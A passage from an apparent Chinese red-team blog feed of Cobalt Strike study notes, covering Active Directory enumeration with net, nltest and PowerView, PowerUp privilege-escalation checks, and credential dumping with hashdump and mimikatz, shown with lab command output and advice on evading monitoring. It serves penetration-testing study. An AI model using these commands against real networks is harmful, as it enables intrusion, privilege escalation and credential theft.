bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:  <span class="token punctuation">.</span><span class="token comment">#####.   mimikatz 2.1 (x64) built on Nov 10 2016 15:31:14</span> <span class="token punctuation">.</span><span class="token comment">## ^ ##.  "A La Vie, A L'Amour"</span> <span class="token comment">## / \ ##  /* * *</span> <span class="token comment">## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span> <span class="token string">'## v ##'</span>   http:<span class="token operator">/</span><span class="token operator">/</span>blog<span class="token punctuation">.</span>gentilkiwi<span class="token punctuation">.</span>com<span class="token operator">/</span>mimikatz             <span class="token punctuation">(</span>oe<span class="token punctuation">.</span>eo<span class="token punctuation">)</span>  <span class="token string">'#####'</span>                                     with 20 modules <span class="token operator">*</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token operator">/</span>mimikatz<span class="token punctuation">(</span>powershell<span class="token punctuation">)</span> <span class="token comment"># sekurlsa::logonpasswords</span>Authentication Id : 0 <span class="token punctuation">;</span> 314628 <span class="token punctuation">(</span>00000000:0004cd04<span class="token punctuation">)</span>Session           : Interactive <span class="token keyword">from</span> 1User Name         : administratorDomain            : TEAMSSIXLogon Server      : WIN<span class="token operator">-</span>P2AASSD1AF1Logon Time        : 2020<span class="token operator">/</span>8<span class="token operator">/</span>20 23:53:08SID               : S<span class="token operator">-</span>1<span class="token operator">-</span>5<span class="token operator">-</span>22<span class="token operator">-</span>3301978333<span class="token operator">-</span>983314215<span class="token operator">-</span>684642015<span class="token operator">-</span>500msv : <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary <span class="token operator">*</span> Username : Administrator……内容过多，余下部分省略……<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs16-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>终于把碰到的坑都填完了，睡觉……</p><blockquote><p>参考链接：</p><p><a href="https://blog.51cto.com/simeon/2126106">https://blog.51cto.com/simeon/2126106</a></p><p><a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p><p><a href="https://blog.csdn.net/hnjztyx/article/details/52910478">https://blog.csdn.net/hnjztyx/article/details/52910478</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CS 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CS学习笔记】15、枚举的命令和方法</title>
      <link href="//200419-150608.html"/>
      <url>//200419-150608.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-Windows-企业局域网环境介绍"><a href="#0x00-Windows-企业局域网环境介绍" class="headerlink" title="0x00 Windows 企业局域网环境介绍"></a>0x00 Windows 企业局域网环境介绍</h1><h2 id="1、活动目录"><a href="#1、活动目录" class="headerlink" title="1、活动目录"></a>1、活动目录</h2><p>活动目录<code>Active Directory</code>是一种能够集中管理用户、系统和策略的技术，活动目录的一个重要概念就是<code>域</code>。</p><p>Active Directory 存储有关网络上对象的信息，并让管理员和用户可以更容易地使用这些信息。例如 Active Directory 域服务即 AD DS 存储着有关用户账户的信息，并且使同一网络下的其他授权用户可以访问此信息。</p><h2 id="2、域"><a href="#2、域" class="headerlink" title="2、域"></a>2、域</h2><p>域<code>Domain</code>即是一个管理员或者说是网络边界，在域里的用户和系统都是通过 AD进行管理的。</p><p>在域里，如果想控制服务器进行操作就需要取得域的信任。</p><h2 id="3、域控制器"><a href="#3、域控制器" class="headerlink" title="3、域控制器"></a>3、域控制器</h2><p>域控制器<code>Domain Controller</code>顾名思义就是一个对域里的用户和系统进行身份验证的一个系统。</p><h2 id="4、本地用户"><a href="#4、本地用户" class="headerlink" title="4、本地用户"></a>4、本地用户</h2><p>本地用户<code>Local User</code>就是系统上的一个标准用户。</p><p>当我们想在 Windows 命令行下指定一个本地的用户时，可以通过输入 <code>.\本地用户名</code>或者 <code>计算机名\本地用户名</code>来指定本地的用户账户，其中<code>.</code>表示计算机名。</p><h2 id="5、域用户"><a href="#5、域用户" class="headerlink" title="5、域用户"></a>5、域用户</h2><p>域用户<code>Domain User</code>是指域控制器下的用户，如果想指定域用户，可以输入<code>域名\域用户名</code></p><h2 id="6、本地管理员"><a href="#6、本地管理员" class="headerlink" title="6、本地管理员"></a>6、本地管理员</h2><p>本地管理员<code>Local Administrator</code>即是指在本地系统有管理权限的用户。</p><h2 id="7、域管理员"><a href="#7、域管理员" class="headerlink" title="7、域管理员"></a>7、域管理员</h2><p>域管理员<code>Domain Administrator</code>是指在域控制器上有管理权限的用户。</p><blockquote><p>注意：以下命令是在主机中运行的结果，在 Cobalt Strike 中运行只需要根据命令类型在命令前加上 shell 或者 powershell 即可。</p></blockquote><h1 id="0x01-枚举主机和域信任"><a href="#0x01-枚举主机和域信任" class="headerlink" title="0x01 枚举主机和域信任"></a>0x01 枚举主机和域信任</h1><h2 id="1、一些问题"><a href="#1、一些问题" class="headerlink" title="1、一些问题"></a>1、一些问题</h2><p>当进入目标局域网时，需要弄清楚几个问题。</p><p>1、我正处在那个域上？</p><p>2、域信任关系是什么样的？</p><p>3、可以登陆哪些域？这些域上有哪些系统？目标是什么？可以获取什么？</p><p>4、系统上存放共享数据的地方在哪里？</p><h2 id="2、一些枚举的命令"><a href="#2、一些枚举的命令" class="headerlink" title="2、一些枚举的命令"></a>2、一些枚举的命令</h2><ul><li><p><code>net view /domain</code> </p><p>枚举出当前域</p></li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> net view <span class="token operator">/</span>domainDomain<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>TEAMSSIX命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><code>net view /domain:[domain]</code>、<code>net group &quot;domain computers&quot; /domain</code></p><p><code>net view /domain:[domain]</code>枚举域上一个主机的列表，但不是所有主机，这个也就是在网上邻居中可以看到的内容。</p><p><code>net group &quot;domain computers&quot; /domain</code>可以获得加入到这个域中的电脑账户列表。</p></li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> net view <span class="token operator">/</span>domain:teamssix服务器名称            注解<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>\\WIN<span class="token operator">-</span>72A8ERDSF2P\\WIN<span class="token operator">-</span>P2AASSD1AF1命令成功完成。<span class="token function">PS</span> C:\> net <span class="token function">group</span> <span class="token string">"domain computers"</span> <span class="token operator">/</span>domain组名     Domain Computers注释     加入到域中的所有工作站和服务器成员<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>WIN<span class="token operator">-</span>72A8ERDSF2P$命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><code>nltest /dclist:[domain]</code></p><p>如果想找到那个主机是域的域控服务器，可以使用<code>nltest</code>命令</p></li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> nltest <span class="token operator">/</span>dclist:teamssix获得域“teamssix”中 DC 的列表<span class="token punctuation">(</span>从“\\WIN<span class="token operator">-</span>P2AASSD1AF1”中<span class="token punctuation">)</span>。    WIN<span class="token operator">-</span>P2AASSD1AF1<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>com <span class="token namespace">[PDC]</span>  <span class="token namespace">[DS]</span> 站点: Default<span class="token operator">-</span>First<span class="token operator">-</span>Site<span class="token operator">-</span>Name此命令成功完成<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>​        当使用 32 位的 payload 运行在 64 位的系统上，并且 nltest 路径不对的时候，可能会提示没有 nltest 这个命令，这时可以尝试使用下面的命令为其指定路径。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> C:\windows\sysnative\nltest <span class="token operator">/</span>dclist:teamssix获得域“teamssix”中 DC 的列表<span class="token punctuation">(</span>从“\\WIN<span class="token operator">-</span>P2AASSD1AF1”中<span class="token punctuation">)</span>。    WIN<span class="token operator">-</span>P2AASSD1AF1<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>com <span class="token namespace">[PDC]</span>  <span class="token namespace">[DS]</span> 站点: Default<span class="token operator">-</span>First<span class="token operator">-</span>Site<span class="token operator">-</span>Name此命令成功完成<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><code>nslookup [name]</code>、<code>ping -n 1 -4 [name]</code></p><p>有时在 Cobalt Strike 里，我们只需要使用目标的 NetBIOS 名称，而不用在意使用 IPv4 地址或者 IPv6 地址，NetBIOS 名称是在域上每台机器的完整名称。</p><p>但是如果想通过一个 IPv4 地址转换为一个 NetBIOS 名称，可以使用 nslookup 命令，或者使用 ping 发送一个包来获得主机返回的 IP 地址。</p></li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> nslookup WIN<span class="token operator">-</span>P2AASSD1AF1服务器:  UnKnownAddress:  ::1名称:    WIN<span class="token operator">-</span>P2AASSD1AF1<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>comAddress:  192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>15<span class="token punctuation">.</span>124<span class="token function">PS</span> C:\> ping <span class="token operator">-</span>n 1 <span class="token operator">-</span>4 WIN<span class="token operator">-</span>P2AASSD1AF1正在 Ping WIN<span class="token operator">-</span>P2AASSD1AF1<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>com <span class="token punctuation">[</span>192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>15<span class="token punctuation">.</span>124<span class="token punctuation">]</span> 具有 32 字节的数据:来自 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>15<span class="token punctuation">.</span>124 的回复: 字节=32 时间&lt;1ms TTL=128192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>15<span class="token punctuation">.</span>124 的 Ping 统计信息:    数据包: 已发送 = 1，已接收 = 1，丢失 = 0 <span class="token punctuation">(</span>0<span class="token operator">%</span> 丢失<span class="token punctuation">)</span>，往返行程的估计时间<span class="token punctuation">(</span>以毫秒为单位<span class="token punctuation">)</span>:    最短 = 0ms，最长 = 0ms，平均 = 0ms<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><code>nltest /domain_trusts</code>、<code>nltest /server:[address] /domain_trusts</code></p><p>如果想取得域上的信任关系，可以使用 nltest 命令来实现。</p></li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> nltest <span class="token operator">/</span>domain_trusts域信任的列表:    0: TEAMSSIX teamssix<span class="token punctuation">.</span>com <span class="token punctuation">(</span>NT 5<span class="token punctuation">)</span> <span class="token punctuation">(</span>Forest Tree Root<span class="token punctuation">)</span> <span class="token punctuation">(</span>Primary Domain<span class="token punctuation">)</span> <span class="token punctuation">(</span>Native<span class="token punctuation">)</span>此命令成功完成<span class="token function">PS</span> C:\> nltest <span class="token operator">/</span>server:192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>15<span class="token punctuation">.</span>124 <span class="token operator">/</span>domain_trusts域信任的列表:    0: TEAMSSIX teamssix<span class="token punctuation">.</span>com <span class="token punctuation">(</span>NT 5<span class="token punctuation">)</span> <span class="token punctuation">(</span>Forest Tree Root<span class="token punctuation">)</span> <span class="token punctuation">(</span>Primary Domain<span class="token punctuation">)</span> <span class="token punctuation">(</span>Native<span class="token punctuation">)</span>此命令成功完成<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p><code>net view \\[name]</code></p><p>如果想列出主机上的共享列表，只需输入<code>net view \\[name]</code>即可</p></li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> net view \\WIN<span class="token operator">-</span>P2AASSD1AF1在 \\WIN<span class="token operator">-</span>75F8PRJM4TP 的共享资源共享名  类型  使用为  注释<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>Users   Disk命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x02-PowerView"><a href="#0x02-PowerView" class="headerlink" title="0x02 PowerView"></a>0x02 PowerView</h1><p>在渗透进入内网后，如果直接使用 Windows 的内置命令，比如 <code>net view、net user</code>等，可能就会被管理人员或者各种安全监控设备所发现。因此较为安全的办法就是使用 Powershell 和 VMI 来进行躲避态势感知的检测。</p><p>PowerView 是由 Will Schroeder 开发的 PowerShell 脚本，该脚本完全依赖于 Powershell 和 VMI ，使用 PowerView 可以更好的收集内网中的信息，在使用之前，与上一节 PowerUp 的一样需要先 import 导入 ps1 文件。</p><p>PowerView 下载地址：<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon</a></p><p>一些 PowerView 的命令：</p><ul><li><p>Get-NetDomain</p><p>查询本地域的信息</p></li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\PowerView> <span class="token function">Get-NetDomain</span>Forest                  : teamssix<span class="token punctuation">.</span>comDomainControllers       : <span class="token punctuation">&#123;</span>WIN<span class="token operator">-</span>P2AASSD1AF1<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>com<span class="token punctuation">&#125;</span>Children                : <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>DomainMode              : Windows2012DomainParent                  :PdcRoleOwner            : WIN<span class="token operator">-</span>P2AASSD1AF1<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>comRidRoleOwner            : WIN<span class="token operator">-</span>P2AASSD1AF1<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>comInfrastructureRoleOwner : WIN<span class="token operator">-</span>P2AASSD1AF1<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>comName                    : teamssix<span class="token punctuation">.</span>com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>Invoke-ShareFinder</p><p>查找网络上是否存在共享</p></li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\PowerView> <span class="token function">Invoke-ShareFinder</span>\\WIN<span class="token operator">-</span>P2AASSD1AF1<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>com\ADMIN$   <span class="token operator">-</span> 远程管理\\WIN<span class="token operator">-</span>P2AASSD1AF1<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>com\C$       <span class="token operator">-</span> 默认共享\\WIN<span class="token operator">-</span>P2AASSD1AF1<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>com\IPC$     <span class="token operator">-</span> 远程 IPC\\WIN<span class="token operator">-</span>P2AASSD1AF1<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>com\NETLOGON         <span class="token operator">-</span> Logon server share\\WIN<span class="token operator">-</span>P2AASSD1AF1<span class="token punctuation">.</span>teamssix<span class="token punctuation">.</span>com\SYSVOL   <span class="token operator">-</span> Logon server share<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>Invoke-MapDomainTrust</p><p>显示当前域的信任关系</p></li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\PowerView> <span class="token function">Invoke-MapDomainTrust</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其他更多用法可以查看参考链接，或者参考 PowerView 项目上的 ReadMe 部分。</p><h1 id="0X03-Net-模块"><a href="#0X03-Net-模块" class="headerlink" title="0X03 Net 模块"></a>0X03 Net 模块</h1><p>Cobalt Strike 中有自己的 net 模块，net 模块是 beacon 后渗透攻击模块，它通过 windows 的网络管理 api 函数来执行命令，想使用 net 命令，只需要在 beacon 的控制中心输入 net + 要执行的命令即可。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">net dclist : 列出当前域的域控制器net dclist <span class="token namespace">[DOMAIN]</span> : 列出指定域的域控制器net share \\<span class="token namespace">[name]</span> : 列出目标的共享列表net view : 列出当前域的主机net view <span class="token namespace">[DOMAIN]</span> : 列出指定域的主机<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 beacon 控制台中输入这些命令很类似输入一个本地的 net 命令，但是有一些些许的不同，比如下面一个是在主机上运行 net view 的结果一个是在 beacon 控制台下运行 net view 的结果。不难看出，beacon 下输出的结果更为丰富。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\> net view服务器名称            注解<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>\\WIN<span class="token operator">-</span>P2AASSD1AF1命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> net view<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run net view<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 104504 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:List of hosts:Server Name             IP Address                       Platform  Version  <span class="token function">Type</span>   Comment<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>             <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>                       <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">--</span>  <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>  <span class="token operator">--</span>-<span class="token operator">-</span>   <span class="token operator">--</span>-<span class="token operator">--</span>-<span class="token operator">-</span>WIN<span class="token operator">-</span>P2AASSD1AF1         192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>15<span class="token punctuation">.</span>124                   500       6<span class="token punctuation">.</span>1      PDC    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs15-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p><p><a href="https://www.freebuf.com/sectool/173366.html">https://www.freebuf.com/sectool/173366.html</a></p><p><a href="https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview">https://docs.microsoft.com/zh-cn/windows-server/identity/ad-ds/get-started/virtual-dc/active-directory-domain-services-overview</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CS 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CS学习笔记】14、powerup提权的方法</title>
      <link href="//200419-150600.html"/>
      <url>//200419-150600.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-介绍"><a href="#0x00-介绍" class="headerlink" title="0x00 介绍"></a>0x00 介绍</h1><p>PowerUp 所做的事是寻找可能存在弱点的地方，从而帮助提权。</p><p>利用 PowerUp 进行提权需要首先导入 ps1 文件<code>powershell-import PowerUp.ps1</code>，再执行<code>powershell Invoke-AllChecks</code>命令，使用 PowerUp 脚本可以快速的帮助我们发现系统弱点，从而实现提权的目的。</p><blockquote><p>其中<code>PowerUp.ps1</code>文件可从这里下载：<a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</a></p></blockquote><h1 id="0x01-PowerUp-的使用"><a href="#0x01-PowerUp-的使用" class="headerlink" title="0x01 PowerUp 的使用"></a>0x01 PowerUp 的使用</h1><p>执行以下命令：将 ps1 文件上传到目标主机，并执行所有弱点检查。</p><pre class="line-numbers language-none"><code class="language-none">powershell-import PowerUp.ps1powershell invoke-allchecks<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>详细运行过程：</p><pre class="line-numbers language-none"><code class="language-none">beacon&gt; powershell-import PowerUp.ps1[*] Tasked beacon to import: PowerUp.ps1[+] host called home, sent: 275084 bytesbeacon&gt; powershell invoke-allchecks[*] Tasked beacon to run: invoke-allchecks[+] host called home, sent: 313 bytes[+] received output:[*] Running Invoke-AllChecks[+] Current user already has local administrative privileges![*] Checking for unquoted service paths...[*] Checking service executable and argument permissions...[+] received output:ServiceName                     : AeLookupSvcPath                            : C:\Windows\system32\svchost.exe -k netsvcsModifiableFile                  : C:\Windows\system32ModifiableFilePermissions       : GenericAllModifiableFileIdentityReference : BUILTIN\AdministratorsStartName                       : localSystemAbuseFunction                   : Install-ServiceBinary -Name &#39;AeLookupSvc&#39;CanRestart                      : True……内容太多，此处省略……[*] Checking service permissions...[+] received output:ServiceName   : AeLookupSvcPath          : C:\Windows\system32\svchost.exe -k netsvcsStartName     : localSystemAbuseFunction : Invoke-ServiceAbuse -Name &#39;AeLookupSvc&#39;CanRestart    : True……内容太多，此处省略……[*] Checking %PATH% for potentially hijackable DLL locations...[+] received output:Permissions       : GenericAllModifiablePath    : C:\Windows\system32\WindowsPowerShell\v1.0\IdentityReference : BUILTIN\Administrators%PATH%            : %SystemRoot%\system32\WindowsPowerShell\v1.0\AbuseFunction     : Write-HijackDll -DllPath &#39;C:\Windows\system32\WindowsPowerS                    hell\v1.0\\wlbsctrl.dll&#39;……内容太多，此处省略……[*] Checking for AlwaysInstallElevated registry key...[*] Checking for Autologon credentials in registry...[*] Checking for modifidable registry autoruns and configs...[+] received output:Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\VMware Use                 r ProcessPath           : &quot;C:\Program Files\VMware\VMware Tools\vmtoolsd.exe&quot; -n vmusrModifiableFile : @&#123;Permissions&#x3D;System.Object[]; ModifiablePath&#x3D;C:\Program Files                 \VMware\VMware Tools\vmtoolsd.exe; IdentityReference&#x3D;BUILTIN\A                 dministrators&#125;……内容太多，此处省略……[*] Checking for modifiable schtask files&#x2F;configs...[+] received output:TaskName     : GoogleUpdateTaskMachineCoreTaskFilePath : @&#123;Permissions&#x3D;System.Object[]; ModifiablePath&#x3D;C:\Program Files (               x86)\Google\Update\GoogleUpdate.exe; IdentityReference&#x3D;BUILTIN\A               dministrators&#125;TaskTrigger  : &lt;Triggers xmlns&#x3D;&quot;http:&#x2F;&#x2F;schemas.microsoft.com&#x2F;windows&#x2F;2004&#x2F;02&#x2F;mi               t&#x2F;task&quot;&gt;&lt;LogonTrigger&gt;&lt;Enabled&gt;true&lt;&#x2F;Enabled&gt;&lt;&#x2F;LogonTrigger&gt;&lt;Cal               endarTrigger&gt;&lt;StartBoundary&gt;2020-04-11T21:47:44&lt;&#x2F;StartBoundary&gt;&lt;               ScheduleByDay&gt;&lt;DaysInterval&gt;1&lt;&#x2F;DaysInterval&gt;&lt;&#x2F;ScheduleByDay&gt;&lt;&#x2F;Ca               lendarTrigger&gt;&lt;&#x2F;Triggers&gt;……内容太多，此处省略……[*] Checking for unattended install files...UnattendPath : C:\Windows\Panther\Unattend.xml[*] Checking for encrypted web.config strings...[*] Checking for encrypted application pool and virtual directory passwords...[*] Checking for plaintext passwords in McAfee SiteList.xml files....[+] received output:[*] Checking for cached Group Policy Preferences .xml files....[+] received output:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果在自己的靶机上发现导入ps1文件失败，这可能是因为系统不允许执行不信任的脚本文件导致的。</p><p>这时为了复现成功可以来到靶机下，以管理员权限打开 Powershell，运行<code>set-ExecutionPolicy RemoteSigned</code>，输入<code>Y</code>回车，此时系统便能导入<code> PowerUp.ps1</code>文件了。</p><pre class="line-numbers language-none"><code class="language-none">PS C:\WINDOWS\system32&gt; set-ExecutionPolicy RemoteSigned执行策略更改执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:&#x2F;go.microsoft.com&#x2F;fwlink&#x2F;?LinkID&#x3D;135170中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?[Y] 是(Y)  [A] 全是(A)  [N] 否(N)  [L] 全否(L)  [S] 暂停(S)  [?] 帮助 (默认值为“N”): YPS C:\WINDOWS\system32&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在运行<code>Invoke-AllChecks</code>后，便会列出当前系统中可被提权的弱点之处，之后再执行检查结果中<code>AbuseFunction</code>下的命令便能开始提权操作了。</p><p>但是我在自己本地环境中并未复现成功，执行<code>AbuseFunction</code>后的命令只能创建一个与当前登录用户相同权限的账户，没能达到提权的目的。</p><p>参考网上相关文章后也未果，这也是为什么这一节拖更这么久的原因，因此 PowerUp 的复现过程暂时就没法记录了。</p><p>如果正在看本篇文章的你有过使用 PowerUp 提权成功的经历，欢迎留言分享。</p><h1 id="0x02-获取凭证和哈希"><a href="#0x02-获取凭证和哈希" class="headerlink" title="0x02 获取凭证和哈希"></a>0x02 获取凭证和哈希</h1><p>想要获取凭证信息，可以在管理员权限的会话处右击选择<code>Access --&gt; Dump Hashes</code>，或者在控制台中使用<code>hashdump</code>命令。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs14-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>想获取当前用户的密码，可以运行<code>mimikatz</code>，右击管理员权限会话选择<code>Access --&gt; Run Mimikatz</code>，或在控制台运行<code>logonpasswords</code>命令。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs14-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>在<code>View --&gt; 